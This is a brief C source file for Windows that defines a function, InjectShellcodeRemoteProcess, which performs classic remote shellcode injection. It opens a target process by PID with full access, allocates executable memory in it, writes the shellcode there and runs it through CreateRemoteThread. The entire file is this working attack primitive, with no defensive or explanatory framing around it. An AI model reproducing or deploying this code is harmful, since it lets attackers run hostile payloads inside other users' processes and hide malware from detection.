#include <stdio.h>
#include <Windows.h>
#include "AsmCodes.h"

VOID InjectShellcodeRemoteProcess(UINT32 ProcessId, unsigned char* Shellcode, unsigned int ShellcodeLen)
{
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i", ProcessId);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD) ProcessId);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, ShellcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, Shellcode, ShellcodeLen, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
}